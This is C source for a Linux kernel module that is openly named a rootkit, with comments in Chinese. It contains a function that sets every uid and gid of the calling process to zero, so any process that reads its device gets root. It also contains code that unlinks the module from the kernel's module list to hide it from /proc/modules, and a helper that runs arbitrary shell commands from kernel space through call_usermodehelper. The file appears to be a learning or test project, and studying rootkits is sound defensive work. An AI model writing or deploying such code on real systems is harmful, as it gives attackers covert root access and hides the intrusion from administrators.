#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include "rootkit.h"

// 修改cred获得root权限
static void get_root(void)
{
    struct cred *newcreds;
    newcreds = prepare_creds();
    if (newcreds == NULL)
        return;
    newcreds->uid.val = newcreds->gid.val = 0;
    newcreds->euid.val = newcreds->egid.val = 0;
    newcreds->suid.val = newcreds->sgid.val = 0;
    newcreds->fsuid.val = newcreds->fsgid.val = 0;
    commit_creds(newcreds);
    // 第二种方法同样可行
    // commit_creds(prepare_creds(NULL);
}

static int rootkit_open(struct inode *__inode, struct file *__file)
{
    return 0;
}

static ssize_t rootkit_read(struct file *__file, char __user *user_buf, size_t size, loff_t *__loff)
{
    pr_info("rootkit read!!");
    get_root();
    return 0;
}

static ssize_t rootkit_write(struct file *__file, const char __user *user_buf, size_t size, loff_t *__loff)
{
    pr_info("rootkit wirte!!");
    return 0;
}

static int rootkit_release(struct inode *__inode, struct file *__file)
{
    return 0;
}

static long rootkit_ioctl(struct file *__file, unsigned int cmd, unsigned long param)
{
    return 0;
}

static inline void module_info(void)
{
    prev = THIS_MODULE->list.prev;
}

// 模块隐藏函数定义
static void hide_myself(void)
{
    // 摘除链表，/proc/modules中不可见
    list_del(&THIS_MODULE->list);

    // 摘除kobj，/sys/modules/中不可见。
    // kobject_del(&THIS_MODULE->mkobj.kobj);
}

// 模块隐藏恢复
static void show_myself(void)
{
    list_add(&THIS_MODULE->list, prev);
    // kobject_put(&mod.mkobj.kobj);
}

// 命令执行，测试模块
static char *exec_cmd(char cmd[1024])
{
    // 可以创建文件，但是似乎出现了些许问题
    struct file *fp;
    char cmd_path[] = "/bin/sh";
    // char output[] = " > /tmp/result.txt";
    // strcat(cmd, output);
    char *cmd_argv[] = {cmd_path, "-c", cmd, NULL};
    char *cmd_envp[] = {"HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL};
    call_usermodehelper(cmd_path, cmd_argv, cmd_envp, UMH_WAIT_PROC);
    return 0;

    // fp = filp_open("/tmp/result.txt", O_RDWR | O_CREAT, 0644);
    // if (IS_ERR(fp))
    // {
    //     pr_info("open file failed!");
    //     return 0;
    // }
    // return 0;
    // memset(buf, 0, sizeof(buf));
    // pos = 0;
    // int old_fs = get_fs();
    // set_fs(get_ds());
    // vfs_read(fp, buf, sizeof(buf), &pos);
    // pr_info("%s\n", buf);
    // filp_close(fp, NULL);
    // set_fs(old_fs);
    // return buf;
}